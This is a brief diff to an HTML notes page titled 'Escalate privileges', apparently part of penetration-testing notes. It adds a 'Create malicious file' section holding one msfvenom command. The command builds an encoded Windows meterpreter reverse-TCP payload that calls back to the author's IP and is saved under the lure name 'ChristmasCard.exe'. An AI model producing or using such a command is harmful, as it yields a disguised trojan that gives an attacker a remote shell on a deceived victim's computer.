@@ -3,3 +3,9 @@
   <a href=../index.html>Back to home</a>
 <hr/>
 <h1>Escalate privileges</h1>
+    <h2>Create malicious file</h2>
+    <ol><p><ul>
+        msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=[MY IP ADDRESS] -f exe > /home/MyUsername/Desktop/ChristmasCard.exe
+    </ul>
+        <ul></ul>
+    </p></ol>
